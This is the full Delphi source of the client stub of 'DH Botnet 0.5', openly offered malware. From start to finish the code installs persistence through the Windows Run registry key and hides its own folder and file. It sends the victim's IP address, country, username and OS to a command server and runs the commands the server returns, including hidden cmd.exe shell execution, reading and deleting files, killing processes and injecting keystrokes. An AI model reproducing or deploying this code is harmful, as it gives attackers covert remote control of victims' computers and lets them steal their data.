// DH Botnet 0.5
// (C) Doddy Hackman 2013

// Stub

program stub;

// {$APPTYPE CONSOLE}
{$POINTERMATH ON}

uses
  SysUtils, WinInet, Windows, TlHelp32, ShellApi;

var
  datos: string;
  clave: string;
  ip: string;
  pais: string;
  user: string;
  os: string;

  url_master: string;
  time: string;

  code: string;
  ordenes_re: string;
  ordenes_cmd: string;
  ordenes_ar1: string;
  ordenes_ar2: string;
  ordenes_ar3: string;

var
  dir_hide, dir, carpeta, nombrereal, directorio, rutareal, yalisto: string;
  registro: HKEY;

  ob: THandle;
  codex: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  todo: string;


  // Functions server

function crazy_mouse(number: string): string;
var
  i: integer;
  code: string;
begin
  code := '';
  For i := 1 to StrToInt(number) do
  begin
    Sleep(1000);
    SetCursorPos(i, i);
  end;
  code := '[?] Crazy Mouse : OK';
  Result := code;
end;

function SendKeys(texto: string): string;
// Thanks to Remy Lebeau for the help
var
  eventos: PInput;
  controlb, controla: integer;
  code: string;
begin

  code := '';
  code := '[?] SendKeys : OK';

  GetMem(eventos, SizeOf(TInput) * (Length(texto) * 2));

  controla := 0;

  for controlb := 1 to Length(texto) do
  begin

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE or KEYEVENTF_KEYUP;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

  end;

  SendInput(controla, eventos[0], SizeOf(TInput));

  Result := code;

end;

function escribir_word(texto: string): string;
var
  code: string;
begin
  code := '';
  code := '[?] Word Joke : OK';
  ShellExecute(0, nil, PChar('winword.exe'), nil, nil, SW_SHOWNORMAL);
  Sleep(5000);
  SendKeys(texto);
  Result := code;

end;

function cambiar_barra(opcion: string): string;
var
  code: string;
begin
  code := '';

  if (opcion = 'hide') then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
    code := '[?] Hidden Taskbar : OK';
  end
  else
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
    code := '[?] Show Taskbar : OK';
  end;

  Result := code;

end;

function cambiar_iconos(opcion: string): string;
var
  code: string;
  acatoy: THandle;
begin
  code := '';
  acatoy := FindWindow('ProgMan', nil);
  acatoy := GetWindow(acatoy, GW_CHILD);
  if (opcion = 'hide') then
  begin
    ShowWindow(acatoy, SW_HIDE);
    code := '[?] Hidden Icons : OK';
  end
  else
  begin
    ShowWindow(acatoy, SW_SHOW);
    code := '[?] Show Icons : OK';
  end;
  Result := code;
end;

function listardirectorio(dir: string): string;
var

  busqueda: TSearchRec;
  code: string;

begin

  code := '';

  FindFirst(dir + '\*.*', faAnyFile + faDirectory + faReadOnly, busqueda);

  code := code + '[?] : ' + busqueda.Name + sLineBreak;

  while FindNext(busqueda) = 0 do
  begin
    code := code + '[?] : ' + busqueda.Name + sLineBreak;
  end;

  Result := code;

end;

function borraresto(archivo: string): string;
var
  code: string;
begin

  code := '';

  if DirectoryExists(archivo) then
  begin
    if (RemoveDir(archivo)) then
    begin
      code := '[?] Directory removed';
    end
    else
    begin
      code := '[?] Error';
    end;
  end;
  if FileExists(archivo) then
  begin
    if (DeleteFile(PChar(archivo))) then
    begin
      code := '[?] File removed';
    end
    else
    begin
      code := '[?] Error';
    end;
  end;

  Result := code;

end;

function matarproceso(pid: string): string;
var
  vano: THandle;
  code: string;

begin

  code := '';
  vano := OpenProcess(PROCESS_TERMINATE, FALSE, StrToInt(pid));

  if TerminateProcess(vano, 0) then
  begin
    code := '[?] Kill Process : OK';
  end
  else
  begin
    code := '[?] Kill Process : ERROR';
  end;

  Result := code;

end;

function listarprocesos(): string;
var
  conector: THandle;
  timbre: LongBool;
  indicio: TProcessEntry32;
  code: string;

begin

  code := '';

  conector := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  indicio.dwSize := SizeOf(indicio);

  timbre := Process32First(conector, indicio);

  while timbre do

  begin

    code := code + '[?] Name : ' + indicio.szExeFile + '[?] PID : ' + IntToStr
      (indicio.th32ProcessID) + sLineBreak;

    timbre := Process32Next(conector, indicio);

  end;

  Result := code;

end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, PChar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    PChar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

    Result := code;

end;

function leerdatos_sub(sub_1, sub_2, sub_3, sub_4: integer): DWORD;
begin
  Result := sub_1 shl 16 or sub_4 shl 14 or sub_2 shl 2 or sub_3;
end;

function opencd(tipoh: string): string;

// Credits : Based on http://stackoverflow.com/questions/19894566/using-windows-and-mmsystem-in-delphi
// Thanks to Sertac Akyuz

const
  const_uno = $00000009;
  const_dos = $0000002D;
  const_tres = 0;
  const_cuatro = 0;
  const_cinco = $0001;
  const_seis = const_dos;
  const_siete = 6;
  const_ocho = 8;

var
  var_uno: string;
  var_dos: THandle;
  var_tres: DWORD;
  opciondecd: integer;

begin

  if (tipoh = 'open') then
  begin
    opciondecd := $0202;
  end;

  if (tipoh = 'close') then
  begin
    opciondecd := $0203;
  end;

  var_uno := Format('\\.\%s:', ['D']);
  var_dos := CreateFile(PChar(var_uno), GENERIC_READ, FILE_SHARE_WRITE, nil,
    OPEN_EXISTING, 0, 0);
  DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_siete, const_tres,
      const_cuatro), nil, 0, nil, 0, var_tres, nil);
  DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_ocho, const_tres,
      const_cuatro), nil, 0, nil, 0, var_tres, nil);
  DeviceIoControl(var_dos, leerdatos_sub(const_seis, opciondecd, const_tres,
      const_cinco), nil, 0, nil, 0, var_tres, nil);
  CloseHandle(var_dos);

  Result := '[?] CD : OK';

end;

//

// First Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function partirdoc(Url: string): string;
var
  chauhost: string;
begin

  Url := StringReplace(Url, regex(Url, '://', '/'), '', [rfReplaceAll,
    rfIgnoreCase]);
  Url := StringReplace(Url, 'http://', '', [rfReplaceAll, rfIgnoreCase]);
  Url := StringReplace(Url, 'https://', '', [rfReplaceAll, rfIgnoreCase]);

  Result := Url;

end;

function getfilename(Url: string): string;
// Credits : Based on http://delphi-kb.blogspot.com.ar/2009/12/extract-filename-from-url.html
// Thanks to NM
var
  resultado: string;
begin
  resultado := StringReplace(Url, '/', '\', [rfReplaceAll]);
  resultado := ExtractFileName(resultado);
  Result := resultado;
end;

function toma(const pagina: string): UTF8String;

// Credits : Based on http://www.scalabium.com/faq/dct0080.htm
// Thanks to www.scalabium.com

var
  nave1: HINTERNET;
  nave2: HINTERNET;
  tou: DWORD;
  codez: UTF8String;
  codee: array [0 .. 1023] of byte;
  finalfinal: string;

begin

  try

    begin

      finalfinal := '';
      Result := '';

      nave1 := InternetOpen(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12'
          , INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

      nave2 := InternetOpenUrl(nave1, PChar(pagina), nil, 0,
        INTERNET_FLAG_RELOAD, 0);

      repeat

      begin
        InternetReadFile(nave2, @codee, SizeOf(codee), tou);
        SetString(codez, PAnsiChar(@codee[0]), tou);
        finalfinal := finalfinal + codez;
      end;

      until tou = 0;

      InternetCloseHandle(nave2);
      InternetCloseHandle(nave1);

      Result := finalfinal;
    end;

  except
    //
  end;

end;

function tomar(pagina: string; postdata: AnsiString): string;

// Credits : Based on  : http://tulisanlain.blogspot.com.ar/2012/10/how-to-send-http-post-request-in-delphi.html
// Thanks to Tulisan Lain

const
  accept: packed array [0 .. 1] of LPWSTR = (PChar('*/*'), nil);

var
  nave3: HINTERNET;
  nave4: HINTERNET;
  nave5: HINTERNET;
  todod: array [0 .. 1023] of AnsiChar;
  numberz: Cardinal;
  numberzzz: Cardinal;
  finalfinalfinalfinal: string;

begin

  try

    begin

      finalfinalfinalfinal := '';
      Result := '';

      nave3 := InternetOpen(PChar(
          'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12')
          , INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

      nave4 := InternetConnect(nave3, PChar(regex(pagina, '://', '/')),
        INTERNET_DEFAULT_HTTP_PORT, nil, nil, INTERNET_SERVICE_HTTP, 0, 1);

      nave5 := HttpOpenRequest(nave4, PChar('POST'), PChar(partirdoc(pagina)),
        nil, nil, @accept, 0, 1);

      HttpSendRequest(nave5, PChar(
          'Content-Type: application/x-www-form-urlencoded'), Length
          ('Content-Type: application/x-www-form-urlencoded'), PChar(postdata),
        Length(postdata));

      repeat

      begin

        InternetReadFile(nave5, @todod, SizeOf(todod), numberzzz);

        if numberzzz = SizeOf(todod) then
        begin
          Result := Result + AnsiString(todod);
        end;
        if numberzzz > 0 then
          for numberz := 0 to numberzzz - 1 do
          begin
            finalfinalfinalfinal := finalfinalfinalfinal + todod[numberz];
          end;

      end;

      until numberzzz = 0;

      InternetCloseHandle(nave3);
      InternetCloseHandle(nave4);
      InternetCloseHandle(nave5);

      Result := finalfinalfinalfinal;

    end;

  except
    //
  end;

end;

function dh_generate(cantidad: integer): string;

const
  opciones: array [1 .. 3] of string = ('mayus', 'minus', 'numbers');

var
  aleatorio: integer;
  iz: integer;

var
  finalr: string;
begin

  finalr := '';

  for iz := 1 to cantidad do
  begin
    aleatorio := Random(4 - 1) + 1;

    if (opciones[aleatorio] = 'mayus') then
    begin
      finalr := finalr + Chr(ord('A') + Random(26));
    end;
    if (opciones[aleatorio] = 'minus') then
    begin
      finalr := finalr + Chr(ord('a') + Random(26));
    end;
    if (opciones[aleatorio] = 'numbers') then
    begin
      finalr := finalr + Chr(ord('0') + Random(10));
    end;
  end;

  Result := finalr;

end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Writeln(ar, texto);
  CloseFile(ar);

end;

function leerarchivo(rutadelarchivo: string): string;
const
  cantidad_buffer = $8000;

var
  fun_uno: LongWord;
  fun_dos: THandle;
  fun_tres: array [0 .. cantidad_buffer - 1] of AnsiChar;

begin

  fun_tres := '';

  fun_dos := CreateFile(PChar(rutadelarchivo), GENERIC_READ,
    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
    FILE_ATTRIBUTE_READONLY, 0);

  SetFilePointer(fun_dos, 0, nil, FILE_BEGIN);

  ReadFile(fun_dos, fun_tres, cantidad_buffer, fun_uno, nil);

  while (fun_uno > 0) do
  begin
    ReadFile(fun_dos, fun_tres, cantidad_buffer, fun_uno, nil);
  end;

  CloseHandle(fun_dos);

  Result := fun_tres;

end;

function getmydata(): string;
var
  consegui_key, consegui_ip, consegui_pais, consegui_user, consegui_os: string;
  codigo_de_pagina: string;

begin

  consegui_key := leerarchivo('key');
  consegui_key := StringReplace(consegui_key, sLineBreak, '',
    [rfReplaceAll, rfIgnoreCase]);

  codigo_de_pagina := toma('http://whatismyipaddress.com/');

  consegui_ip := regex(codigo_de_pagina, 'alt="Click for more about ',
    '"></a>');
  consegui_pais := regex(codigo_de_pagina, '<tr><th>Country:</th><td>',
    '</td></tr>');

  if (consegui_ip = '') then
  begin
    consegui_ip := '?';
  end;

  if (consegui_pais = '') then
  begin
    consegui_pais := '?';
  end;

  consegui_user := GetEnvironmentVariable('username');
  consegui_os := GetEnvironmentVariable('os');

  Result := '[key]' + consegui_key + '[key]' + '[ip]' + consegui_ip + '[ip]' +
    '[pais]' + consegui_pais + '[pais]' + '[user]' + consegui_user + '[user]' +
    '[os]' + consegui_os + '[os]';

end;

procedure saludo;
begin
  tomar(url_master,
    'entradatrasera=hidad&key=' + clave + '&ip=' + ip + '&pais=' + pais +
      '&username=' + user + '&os=' + os + '&timeout=' + time);

end;

procedure sigo_vivo;
begin

  tomar(url_master, 'sigovivo=alpedo&clavenow=' + clave);

end;

function ver_ordenes(): string;
var
  re_cmd, arg1, arg2, arg3: string;
begin
  code := tomar(url_master, 'ordenespabots=alpedo&clave=' + clave);
  re_cmd := regex(code, '[+] Orden : ', '<br>');
  arg1 := regex(code, '[+] Arg1 : ', '<br>');
  arg2 := regex(code, '[+] Arg2 : ', '<br>');
  arg3 := regex(code, '[+] Arg3 : ', '<br>');
  Result := '[comando]' + re_cmd + '[comando]' + '[arg1]' + arg1 + '[arg1]' +
    '[arg2]' + arg2 + '[arg2]' + '[arg3]' + arg3 + '[arg3]';
end;

procedure mandar_rta(contenido: string);
begin
  tomar(url_master,
    'mandocarajo=alpedo&miclave=' + clave + '&mirta=' + contenido);
end;

begin

  ob := INVALID_HANDLE_VALUE;
  code := '';

  ob := CreateFile(PChar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (ob <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(ob, -9999, nil, FILE_END);
    ReadFile(ob, codex, 9999, nose, nil);
    CloseHandle(ob);
  end;

  todo := regex(codex, '[63686175]', '[63686175]');
  todo := dhencode(todo, 'decode');

  url_master := regex(todo, '[url]', '[url]');
  time := regex(todo, '[time]', '[time]');


  // url_master := 'http://localhost/botnet/';
  // time := '5';

  try

    dir_hide := GetEnvironmentVariable('USERPROFILE') + '/';
    carpeta := 'ratatax';

    dir := dir_hide + carpeta + '/';

    if not(DirectoryExists(dir)) then
    begin
      CreateDir(dir);
    end;

    ChDir(dir);

    nombrereal := ExtractFileName(paramstr(0));
    rutareal := dir;
    yalisto := dir + nombrereal;

    MoveFile(PChar(paramstr(0)), PChar(yalisto));

    SetFileAttributes(PChar(dir), FILE_ATTRIBUTE_HIDDEN);

    SetFileAttributes(PChar(yalisto), FILE_ATTRIBUTE_HIDDEN);

    RegCreateKeyEx(HKEY_LOCAL_MACHINE,
      'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
      REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
    RegSetValueEx(registro, 'uberkk', 0, REG_SZ, PChar(yalisto), 666);
    RegCloseKey(registro);

    if not(FileExists('key')) then
    begin
      Randomize;
      savefile('key', dh_generate(5));
    end;

    datos := getmydata();

    clave := regex(datos, '[key]', '[key]');
    ip := regex(datos, '[ip]', '[ip]');
    pais := regex(datos, '[pais]', '[pais]');
    user := regex(datos, '[user]', '[user]');
    os := regex(datos, '[os]', '[os]');

    // Writeln('[+] Clave : ' + clave);
    // Writeln('[+] IP : ' + ip);
    // Writeln('[+] Pais : ' + pais);
    // Writeln('[+] Username : ' + user);
    // Writeln('[+] OS : ' + os);

    saludo;

    // Writeln('');
    // Writeln('[+] Iniciando bucle');

    while (True) do
    begin

      Sleep(StrToInt(time) * 1000);

      sigo_vivo;
      ordenes_re := ver_ordenes;

      ordenes_cmd := regex(ordenes_re, '[comando]', '[comando]');
      ordenes_ar1 := regex(ordenes_re, '[arg1]', '[arg1]');
      ordenes_ar2 := regex(ordenes_re, '[arg2]', '[arg2]');
      ordenes_ar3 := regex(ordenes_re, '[arg3]', '[arg3]');

      // Writeln('');

      // Writeln('[+] orden : ' + ordenes_cmd);
      // Writeln('[+] ar1 : ' + ordenes_ar1);
      // Writeln('[+] ar2 : ' + ordenes_ar2);
      // Writeln('[+] ar3 : ' + ordenes_ar3);

      if (ordenes_cmd = 'CMD') then
      begin
        mandar_rta(ejecutar(ordenes_ar1));
      end;

      if (ordenes_cmd = 'GetProcess') then
      begin
        mandar_rta(listarprocesos());
      end;

      if (ordenes_cmd = 'KillProcess') then
      begin
        mandar_rta(matarproceso(ordenes_ar1));
      end;

      if (ordenes_cmd = 'ListDir') then
      begin
        mandar_rta(listardirectorio(ordenes_ar1));
      end;

      if (ordenes_cmd = 'Delete') then
      begin
        mandar_rta(borraresto(ordenes_ar1));
      end;

      if (ordenes_cmd = 'OpenFile') then
      begin
        mandar_rta(leerarchivo(ordenes_ar1));
      end;

      if (ordenes_cmd = 'OpenCD') then
      begin
        mandar_rta(opencd('open'));
      end;

      if (ordenes_cmd = 'CloseCD') then
      begin
        mandar_rta(opencd('close'));
      end;

      if (ordenes_cmd = 'HideIcons') then
      begin
        mandar_rta(cambiar_iconos('hide'));
      end;

      if (ordenes_cmd = 'ShowIcons') then
      begin
        mandar_rta(cambiar_iconos('mostrar'));
      end;

      if (ordenes_cmd = 'HideTaskbar') then
      begin
        mandar_rta(cambiar_barra('hide'));
      end;

      if (ordenes_cmd = 'ShowTaskbar') then
      begin
        mandar_rta(cambiar_barra('mostrar'));
      end;

      if (ordenes_cmd = 'SendKeys') then
      begin
        mandar_rta(SendKeys(ordenes_ar1));
      end;

      if (ordenes_cmd = 'OpenWord') then
      begin
        mandar_rta(escribir_word(ordenes_ar1));
      end;

      if (ordenes_cmd = 'CrazyMouse') then
      begin
        mandar_rta(crazy_mouse(ordenes_ar1));
      end;

    end;

  except

    begin
      //
    end;
  end;

end.

// The End ?
